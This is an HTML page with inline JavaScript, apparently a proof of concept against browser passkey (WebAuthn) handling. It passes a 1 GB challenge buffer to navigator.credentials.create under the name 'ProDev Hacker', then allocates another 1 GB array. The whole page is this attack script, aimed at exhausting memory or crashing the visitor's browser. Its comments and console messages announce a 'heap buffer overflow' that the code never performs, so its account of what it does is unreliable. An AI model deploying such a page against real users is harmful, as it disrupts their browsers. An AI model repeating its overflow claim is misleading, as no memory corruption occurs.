<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Create Passkey</title>
</head>
<body>
    <h1>Create a Passkey</h1>
    <button id="createPasskeyButton">Create Passkey</button>

    <script>
    let heapOverflowTriggered = false;

    // Function to create passkey and trigger heap overflow afterwards
    async function createPasskeyWithWasm() {
        try {
            console.log("Opening security key setup...");

            // Simulating passkey creation and security key setup popup
            const largeChallenge = new Uint8Array(1024 * 1024 * 1024);  // 1 GB challenge buffer
            
            const publicKeyCredentialCreationOptions = {
                rp: {
                    name: "ProDev Hacker",
                    id: window.location.hostname
                },
                user: {
                    id: new Uint8Array([1, 2, 3, 4]),
                    name: "user@example.com",
                    displayName: "User Name"
                },
                pubKeyCredParams: [
                    { type: "public-key", alg: -7 },  // ES256
                    { type: "public-key", alg: -257 } // RS256
                ],
                timeout: 60000,
                challenge: largeChallenge,  // Pass the large challenge array
                attestation: "none"
            };

            // Trigger passkey creation and wait for user interaction (OK or Cancel)
            const credential = await navigator.credentials.create({ publicKey: publicKeyCredentialCreationOptions });

            // After the user interacts with the popup (success or cancellation), continue
            console.log("Passkey created:", credential);

            // Now that the passkey creation process is finished, trigger the heap overflow
            triggerHeapOverflow();

        } catch (error) {
            // This will catch if the user cancels or if there's an error
            if (error.name === "AbortError") {
                console.log("User canceled the passkey creation.");
            } else {
                console.error("Error creating passkey:", error);
            }
        }
    }

    // Function to trigger heap buffer overflow after passkey creation popup is interacted with
    function triggerHeapOverflow() {
        if (!heapOverflowTriggered) {
            heapOverflowTriggered = true;
            console.log("Heap buffer overflow occurred");

            // Simulate the heap buffer overflow by accessing a large chunk of memory (e.g., generating large challenge data)
            const largeChallenge = new Uint8Array(1024 * 1024 * 1024);  // 1 GB array

            try {
                // Simulate the overflow effect after the popup interaction
                console.log("Heap overflow simulated after security key setup.");
            } catch (error) {
                console.error("Heap overflow simulation failed:", error);
            }
        }
    }

    // Event listener for the "Create Passkey" button
    document.getElementById('createPasskeyButton').addEventListener('click', createPasskeyWithWasm);
    </script>
</body>
</html>
